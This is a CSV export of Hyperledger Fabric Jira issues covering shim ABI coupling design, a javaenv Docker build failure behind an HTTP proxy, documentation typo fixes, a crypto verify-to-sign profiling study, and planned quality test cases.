What do you think ?;;;","09/Jul/17 11:54 PM;greg.haskins;[~muralisr]
{quote}by having the fabric would provide shim, we preventing users from mixing an incompatible shim
{quote}
The issue that I see is that isn't really accurate. What have three components (peer, shim, and chaincode) and two ABI contracts (the GRPC interface between the shim and peer and the GOLANG interface between the chaincode and shim. Ala.

!abi-contracts.png|thumbnail!

We can only tightly couple one of those contracts. So there's really no ""prevention"" of version disparity here. There is only the manner in which we manage variance when it inevitably occurs down the road. What I am arguing is that its easier to tightly couple the GOLANG contract and loosely couple the GRPC contract, rather than the other way around, since GRPCs/protobufs were designed precisely to do this. With the GOLANG option, we are on our own and there are a million subtle/non-obivous things that can creep in to an interface of this nature if we are not careful. Part of being careful here really requires an automated, CI driven process. We don't have that yet and likely won't in time for v1.0. Furthermore, the question also becomes that even if we can perfectly execute ABI compatibility monitoring on the current shim, are we ready to commit to not breaking that interface for some LTS-style window of time? The answer could be ""yes"", but I am skeptical.

Now to your second point: Note that the shim needs to be in the ""builder"" image, not the runtime. That said, another way we could handle this (and the direction I have been trying to steer us towards) is the notion of a ccenv that is coupled to a chaincode compatibility rather than the peer version. IOW, rather than implicitly having peer vX.Y.Z use ccenv vX.Y.Z, we should have the chaincode dictate what platform it needs. This is precisely what I was driving for in the notion of a ""platform specifier"" in chaintool ([http://fabric-chaintool.readthedocs.io/en/latest/platforms/golang/#platform-specifier]).

In this model, the chaincode deployment package may dictate what container is used to compile it (albeit indirectly) if we allow it to declare some kind of platform specifier. CAR does this today as per above. However, until CAR becomes the universal/canonical format, the others GOLANG/JAVA/etc would need a similar notion. I fully support driving towards this, but I don't think it will be ready for 1.0.

Therefore, my thought process is:
 # We conservatively require the bundling of the shim in chaincode for v1.0 ABI
 # In the future, we adopt some kind of platform-specifier specification in the deployment payloads
 # In the future, we adopt peer modifications to react to the platform specifiers and utilitize the appropriate container (e.g. peer v1.1 uses ccenv:platform-1 for ""platform 1"" chaincode and ccenv:platform-2 for ""platform-2"" chaincode, etc.
 # Payloads that lack a platform specifier are assumed to be v1.0 ABI compliant.

Thoughts?;;;","27/Nov/17 12:40 PM;denyeart;[~greg.haskins] [~mastersingh24] [~muralisr] I'm changing this one from Bug to Improvement.  Change back if you disagree.  And if there are updated thoughts please provide.;;;","21/Sep/18 7:01 PM;mastersingh24;Not sure if we can get this in for 1.4 but we definitely need to do this.  It is becoming a big problem.

Of course we also need to move the actual chaincode dependencies out of the fabric repo and break the link between fabric and chaincode;;;","23/Jan/19 10:54 AM;denyeart;[~sykesm] I've linked this to the Epic you created FAB-12246. Up to you whether you want to refactor/comment in this Jira or close in favor of another in FAB-12246.;;;","09/Apr/19 3:27 PM;MichaelWang;when building chaincode outside the peer, the shim can exist as an independent dependency which can be managed by dep tools. So we can separate this shim as an independent repo. Does this make any sense ?;;;",,,,,,,,,,,
Failed to build javaenv-image in the environment behind an HTTP Proxy,FAB-5179,18961,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nemoto,nemoto,nemoto,05/Jul/17 5:04 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Nov/17 12:43 PM,v1.0.0-rc1,,,Future,,fabric-build,,,,,,0,,,,,,,"javaenv-image build fails with the following messages when I run make docker in the clean environment behind an HTTP proxy. (Some private information is replaced in the messages.)
{noformat}
username@ubuntu:~/go/src/github.com/hyperledger/fabric$ [master] make docker
(...snip)
Building docker javaenv-image
docker build --build-arg 'http_proxy=http://username:password@proxy:port/' --build-arg 'https_proxy=http://username:password@proxy:port/' --build-arg 'HTTP_PROXY=http://username:password@proxy:port/' --build-arg 'HTTPS_PROXY=http://username:password@proxy:port/' -t hyperledger/fabric-javaenv build/image/javaenv
Sending build context to Docker daemon 45.06kB
Step 1/15 : FROM hyperledger/fabric-baseimage:x86_64-0.3.1
---> 9f2e9ec7c527
Step 2/15 : RUN curl -sSL https://services.gradle.org/distributions/gradle-2.12-bin.zip > /tmp/gradle-2.12-bin.zip
---> Running in 67b7ac7cf9b0
---> 7217c844888a
Removing intermediate container 67b7ac7cf9b0
Step 3/15 : RUN unzip -qo /tmp/gradle-2.12-bin.zip -d /opt && rm /tmp/gradle-2.12-bin.zip
---> Running in a06ed18d9793
---> a2903111a9b2
Removing intermediate container a06ed18d9793
Step 4/15 : RUN ln -s /opt/gradle-2.12/bin/gradle /usr/bin
---> Running in 01798ccf7f96
---> 6fdd92624c86
Removing intermediate container 01798ccf7f96
Step 5/15 : ENV MAVEN_VERSION 3.3.9
---> Running in 953c8549ec55
---> 629aaabecbf4
Removing intermediate container 953c8549ec55
Step 6/15 : ENV USER_HOME_DIR ""/root""
---> Running in b11dd5f890a7
---> 9328b095788f
Removing intermediate container b11dd5f890a7
Step 7/15 : RUN mkdir -p /usr/share/maven /usr/share/maven/ref && curl -fsSL http://apache.osuosl.org/maven/maven-3/$MAVEN_VERSION/binaries/apache-maven-$MAVEN_VERSION-bin.tar.gz | tar -xzC /usr/share/maven --strip-components=1 && ln -s /usr/share/maven/bin/mvn /usr/bin/mvn
---> Running in 74cd6545a383
---> 96721e9c4397
Removing intermediate container 74cd6545a383
Step 8/15 : ENV MAVEN_HOME /usr/share/maven
---> Running in 376974cc8496
---> bf69098e8977
Removing intermediate container 376974cc8496
Step 9/15 : ENV MAVEN_CONFIG ""$USER_HOME_DIR/.m2""
---> Running in 3a604fc8d83e
---> 8f1fa5ce6d61
Removing intermediate container 3a604fc8d83e
Step 10/15 : ADD payload/javashim.tar.bz2 /root
---> 540e95717f7c
Removing intermediate container 2f26b777c52a
Step 11/15 : ADD payload/protos.tar.bz2 /root
---> fe3ecd4d4a95
Removing intermediate container 979bad45865b
Step 12/15 : ADD payload/settings.gradle /root
---> 2a4dd848b661
Removing intermediate container 50c476478285
Step 13/15 : WORKDIR /root
---> 049cd9e822c3
Removing intermediate container 1f96781dd701
Step 14/15 : RUN core/chaincode/shim/java/javabuild.sh
---> Running in 2d2871fb369e

FAILURE: Build failed with an exception.

* Where:
Build file '/root/core/chaincode/shim/java/build.gradle' line: 30

* What went wrong:
Error resolving plugin [id: 'com.google.protobuf', version: '0.8.0']
> The response from https://plugins.gradle.org/api/gradle/2.12/plugin/use/com.google.protobuf/0.8.0 was not a valid response from a Gradle Plugin Resolution Service: content type is
'text/html', expected 'application/json' (status code: 407)

* Try:
Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output.
The command '/bin/sh -c core/chaincode/shim/java/javabuild.sh' returned a non-zero code: 1
Makefile:278: recipe for target 'build/image/javaenv/.dummy-x86_64-1.0.0-rc2-snapshot-6c3cb99' failed
make: *** [build/image/javaenv/.dummy-x86_64-1.0.0-rc2-snapshot-6c3cb99] Error 1
username@ubuntu:~/go/src/github.com/hyperledger/fabric${noformat}
 

Note that I have the following settings in .bashrc
{noformat}
export http_proxy=http://username:password@proxy:port/
export https_proxy=http://username:password@proxy:port/
export HTTP_PROXY=http://username:password@proxy:port/
export HTTPS_PROXY=http://username:password@proxy:port/{noformat}
 ",fabric commit 6c3cb99d6d575d975105e05d4b1bbb2a3ea42980,denyeart,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6vz:",,,,,,,,,,,,,,,,,,,,,,,denyeart,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Nov/17 12:41 PM;denyeart;Looks like this was merged, marking as Done.;;;","27/Nov/17 12:43 PM;denyeart;https://gerrit.hyperledger.org/r/#/c/11397/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Typo in test/tools/LTE/README.md,FAB-5180,18963,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,nemoto,nemoto,nemoto,05/Jul/17 6:29 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Oct/17 1:13 AM,v1.0.0-rc1,,,Future,,fabric-docs,,,,,,0,,,,,,,"There are typos in test/tools/LTE/README.md.
 * ""Ledger Traffic Engine (LTE test tool"" should be ""Ledger Traffic Engine (LTE) test tool""
 * ""./runbenchmark.sh"" should be ""./runbenchmarks.sh""",,joe-alewine,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6wf:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Oct/17 1:12 AM;joe-alewine;Merged. https://gerrit.hyperledger.org/r/c/11399/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Spelling error in peer version output,FAB-5184,18977,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,05/Jul/17 11:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Jul/17 5:51 PM,v1.0.0-rc1,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"peer:
 Version: 1.0.0-rc1
 Go version: go1.7.5
 OS/Arch: linux/s390x
 Chaincode:
 Base Image Version: 0.3.1
 Base Docker Namespace: ibmblockchain
 Base Docker Label: org.hyperledger.fabric
 Docker *Namepace*: ibmblockchain",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,120,120,,0%,120,120,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6xr:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Jul/17 11:59 PM;mastersingh24;https://gerrit.hyperledger.org/r/11383;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Correct / remove references to non-Go chaincode,FAB-5185,18980,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,06/Jul/17 12:13 AM,30/Sep/20 11:57 PM,28/Oct/23 3:00 AM,06/Jul/17 9:13 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"The docs still mention Java chaincode as well as future language support (e.g. in the FAQ).

Needs to clean these up",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18252,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6y7:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Jul/17 12:27 AM;mastersingh24;https://gerrit.hyperledger.org/r/11385;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
High Verify to Sign Ratio,FAB-5186,18984,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harrijk,harrijk,harrijk,06/Jul/17 12:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Dec/17 4:50 AM,,,,Future,,fabric-crypto,fabric-orderer,fabric-peer,,,,0,crypto,"orderer,","peer,",,,,"As an exercise to understand how and where the Hyperledger Fabric code verifies and signs endorsements, transactions, blocks, etc., I conducted a basic set of tests modeled after the end-to-end CLI tests that are contained within the fabric code base and collected go profiling information.

The blockchain network consisted of two org (two peers per org) and a solo ordering service. There was no interaction with membership services, nor was TLS enabled.

peer0/org1 and peer0/org2 were targeted as gossip leaders by setting the *CORE_PEER_GOSSIP_ORGLEADER* environment variable to *true*.  This was done to determine the differences in profiling between an org leader that processes endorsements, new blocks from the ordering service, and block requests from other peers that only request blocks from the org leader.

What was surprising is that, on average, the Verify to Sign ratio was approximately 45:1 when reviewing the profiling information.  I have attached both text and graphical versions of the profiling information from all peers and the orderer.

The 30 second profiles were collected after the initial setup of the channel and chaincode were completed.  During the profile collection period, CLI commands were issued to peer0/org1 to invoke an example02 chaincode function that transfers assets between two users (*a* and *b*, where *a* transferred 1 widget to *b*).

I would like to run the same chaincode tests, but through the use of an SDK rather than the CLI to determine if the 45:1 Verify to Sign ratio is replicated.  The reasoning behind this test is that perhaps different code paths are taken (bypassing sign processing or extra verifies occur) when using the CLI and thus skewing what a real world scenario would encounter.

I will continue to investigate this high Verify to Sign ratio.",,C0rWin,harrijk,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/17 12:37 AM;harrijk;orderer-cg.pdf;https://jira.hyperledger.org/secure/attachment/11573/orderer-cg.pdf","06/Jul/17 12:37 AM;harrijk;peer0-6060.prof.txt;https://jira.hyperledger.org/secure/attachment/11568/peer0-6060.prof.txt","06/Jul/17 12:37 AM;harrijk;peer0-cg.pdf;https://jira.hyperledger.org/secure/attachment/11572/peer0-cg.pdf","06/Jul/17 12:37 AM;harrijk;peer1-6061.prof.txt;https://jira.hyperledger.org/secure/attachment/11567/peer1-6061.prof.txt","06/Jul/17 12:37 AM;harrijk;peer1-cg.pdf;https://jira.hyperledger.org/secure/attachment/11571/peer1-cg.pdf","06/Jul/17 12:37 AM;harrijk;peer2-6062.prof.txt;https://jira.hyperledger.org/secure/attachment/11566/peer2-6062.prof.txt","06/Jul/17 12:37 AM;harrijk;peer2-cg.pdf;https://jira.hyperledger.org/secure/attachment/11570/peer2-cg.pdf","06/Jul/17 12:37 AM;harrijk;peer3-6063.prof.txt;https://jira.hyperledger.org/secure/attachment/11565/peer3-6063.prof.txt","06/Jul/17 12:37 AM;harrijk;peer3-cg.pdf;https://jira.hyperledger.org/secure/attachment/11569/peer3-cg.pdf",,,,,,,,,,,,,,,,,,,,,"1|hzy6yf:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,harrijk,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jul/17 2:02 AM;yacovm;I think the biggest problem is that in gossip, there is a lot of usage of asking the MSP what is the organization of a specific peer.
When this is done, certificate sanitation is performed because the certificates use ECDSA. 
The certificate sanitation needs to obtain the certificate validation chain in order to locate the parent certificate (that signed the peer's certificate).
For this - it calls *x509.Verify()*

[There is a plan|https://jira.hyperledger.org/browse/FAB-4496] to add a cache which would decrease the need to perform the verification.

[~adc] please correct me if I'm wrong. 

 ;;;","05/Dec/17 4:52 AM;harrijk;Closing.  See https://jira.hyperledger.org/browse/FAB-4496;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Change Hyperledger Project to Hyperledger,FAB-5189,18988,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,mastersingh24,mastersingh24,06/Jul/17 4:31 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Jul/17 9:14 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6z3:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Jul/17 5:10 AM;mastersingh24;https://gerrit.hyperledger.org/r/11391;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test to remove a particular user within an organization,FAB-5190,18989,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,Ratnakar,Ratnakar,06/Jul/17 5:15 AM,30/Jul/19 11:41 AM,28/Oct/23 3:00 AM,30/Jul/19 11:41 AM,,,,Future,,fabric-quality,,,,,,0,quality,,,,,,"+Test Name+: Remove a particular user within an organization
 +Component+: 
 +Description+: 

* Unregister an user using client (cli/node-sdk)
* Revoke his certificate using Certification authority.
* Admin of the blockchain network could somehow kick out the user (how and what to add to the CRLs list ?)
 +Artifact Locations+:
 +Network Topology+: Standard Network
 +Client Driver+: cli/node
 +Input:+
 +Output:+",,mastersingh24,Ratnakar,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6zb:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,Ratnakar,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 11:41 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Testcase to Unjoin/remove a peer from a channel,FAB-5191,18990,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Invalid,,Ratnakar,Ratnakar,06/Jul/17 5:22 AM,01/Aug/19 11:29 AM,28/Oct/23 3:00 AM,01/Aug/19 11:29 AM,,,,Future,,fabric-quality,,,,,,0,peer,quality,,,,,"+Test Name+: Remove a particular peer within an organization
+Component+:  peer
+Description+: 

Admin should be able to unjoin/remove a peer from a specific channel.

+Artifact Locations+:

+Network Topology+: Standard Network
+Client Driver+: cli/node
+Input:+
+Output:+",,eujungkim,gzhushun,mplisov,nnao,Ratnakar,rootDistress,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-11334,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6zj:",,,,,,,,,,,,,,,,,,,,,,,eujungkim,gzhushun,mplisov,nnao,Ratnakar,rootDistress,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Aug/19 11:29 AM;scottz;We are still waiting for development to provide feature functionality to remove a peer. Nothing to test, so we can close this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix code usage problems,FAB-5194,18994,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,06/Jul/17 12:17 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:56 PM,,,,Future,,fabric-quality,,,,,,0,,,,,,,"Currently, there're still misusage problems w.r.t gramma, typos, wrong params.

 

Recently, there are several patchset to help clean up it.

 

We need some full-scan to try fixing most of the problems before the release.",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy6zz:",,,,,,,,,,,,,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Jul/17 12:50 PM;baohua;https://gerrit.hyperledger.org/r/#/c/11407/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
byfn.sh help text is incorrect,FAB-5195,18999,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nnao,scottz,scottz,06/Jul/17 11:55 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 4:52 AM,v1.0.0,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,"{{The descriptions for ""down"" and ""restart"" are the same as ""up"", so they need to be reworded in the tool script.}}

 
{quote}fabric-samples/first-network$ ./byfn.sh -h
Usage: 
byfn.sh -m up|down|restart|generate [-c <channel name>] [-t <timeout>]
byfn.sh -h|--help (print this message)
-m <mode> - one of 'up', 'down', 'restart' or 'generate'
- 'up' - bring up the network with docker-compose up
- 'down' - *bring up the network with docker-compose up*
- 'restart' - *bring up the network with docker-compose up*
- 'generate' - generate required certificates and genesis block
-c <channel name> - channel name to use (defaults to ""mychannel"")
-t <timeout> - CLI timeout duration in microseconds (defaults to 10000)
{quote}
 ",,nnao,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5196,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy70f:",,,,,,,,,,,,,,,,,,,,,,,nnao,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,mergify/bp/release-2.2/pr-4374,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,main,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,mergify/bp/release-2.2/pr-3750,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,release-2.5,release-2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jul/17 3:22 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11419/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BYFN tutorial: byfn.sh help text is incorrect,FAB-5196,19000,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nnao,scottz,scottz,06/Jul/17 11:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 11:07 AM,v1.0.0,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"The descriptions for ""down"" and ""restart"" are the same as ""up"", so they need to be reworded. Refer to FAB-5195, which was opened to fix the tool itself. this bug is for updating the doc page with the corrected wording.

```

fabric-samples/first-network$ ./byfn.sh -h
Usage: 
 byfn.sh -m up|down|restart|generate [-c <channel name>] [-t <timeout>]
 byfn.sh -h|--help (print this message)
 -m <mode> - one of 'up', 'down', 'restart' or 'generate'
 - 'up' - bring up the network with docker-compose up
 - 'down' - bring up the network with docker-compose up
 - 'restart' - bring up the network with docker-compose up
 - 'generate' - generate required certificates and genesis block
 -c <channel name> - channel name to use (defaults to ""mychannel"")
 -t <timeout> - CLI timeout duration in microseconds (defaults to 10000)

```

 ",,nnao,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5195,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy70n:",,,,,,,,,,,,,,,,,,,,,,,nnao,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jul/17 3:22 AM;nnao;https://gerrit.hyperledger.org/r/#/c/11421/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update System Behave README,FAB-5198,19002,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,07/Jul/17 1:43 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 4:05 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"Need to update the PATH to include the path to the cryptogen and configtxgen executables.
Also mention the Helpful tools section in the contribution section.",,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy713:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jul/17 1:44 AM;latitiah;https://gerrit.hyperledger.org/r/11413;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
How to change read/write permissions on a peer by peer basis within a channel?,FAB-5199,19003,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jarroyer,jarroyer,07/Jul/17 5:15 AM,30/Jul/19 11:59 AM,28/Oct/23 3:00 AM,30/Jul/19 11:59 AM,,,,,,fabric-docs,,,,,,0,,,,,,,"Apparently the feature to give read/write/admin permissions out in the channel configuration step already exists: [https://stackoverflow.com/questions/43017514/roles-readwrite-in-hyperledger] 

However, there's no decent syntax examples or documentation on how or where to delegate these permissions.  ",,jarroyer,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy71b:",,,,,,,,,,,,,,,,,,,,,,,jarroyer,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jul/19 11:59 AM;mastersingh24;No activity in a year or more;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add python2.7 to prerequisites,FAB-5200,19004,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nickgaski,yuki-kon,yuki-kon,07/Jul/17 5:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:29 AM,v1.0.0-rc1,,,Future,,fabric-docs,,,,,,0,,,,,,,"When setting up fabric-sdk-node, ""npm install"" fails without python 2.7.
The error messages are the below.

During installation, node-gyp is used to build modules for fabric-client and fabric-ca-client.
node-gyp requires python v2.7 as prerequisites. python v3.x.x is not supported.
However, python2 is not installed anymore by default on Ubuntu 16.04 LTS. https://wiki.ubuntu.com/XenialXerus/ReleaseNotes
As a result, ""npm install"" fails due to lacking python 2.7.

We need to add python2.7 to prerequisites.

{code:java}

ubuntu@ubuntu:~/fabric-samples/fabcar$ npm install

> pkcs11js@1.0.9 install /home/ubuntu/fabric-samples/fabcar/node_modules/pkcs11js
> npm run build


> pkcs11js@1.0.9 build /home/ubuntu/fabric-samples/fabcar/node_modules/pkcs11js
> node-gyp configure build

gyp ERR! configure error
gyp ERR! stack Error: Can't find Python executable ""python"", you can set the PYTHON env variable.
gyp ERR! stack     at failNoPython (/usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/configure.js:449:14)
gyp ERR! stack     at /usr/local/lib/node_modules/npm/node_modules/node-gyp/lib/configure.js:353:11
gyp ERR! stack     at F (/usr/local/lib/node_modules/npm/node_modules/which/which.js:69:16)
gyp ERR! stack     at E (/usr/local/lib/node_modules/npm/node_modules/which/which.js:81:29)
gyp ERR! stack     at /usr/local/lib/node_modules/npm/node_modules/which/which.js:90:16
gyp ERR! stack     at /usr/local/lib/node_modules/npm/node_modules/which/node_modules/isexe/index.js:44:5
gyp ERR! stack     at /usr/local/lib/node_modules/npm/node_modules/which/node_modules/isexe/access.js:8:5
gyp ERR! stack     at FSReqWrap.oncomplete (fs.js:123:15)
gyp ERR! System Linux 4.4.0-78-generic
gyp ERR! command ""/usr/local/bin/node"" ""/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js"" ""configure"" ""build""
gyp ERR! cwd /home/ubuntu/fabric-samples/fabcar/node_modules/pkcs11js
gyp ERR! node -v v6.9.5
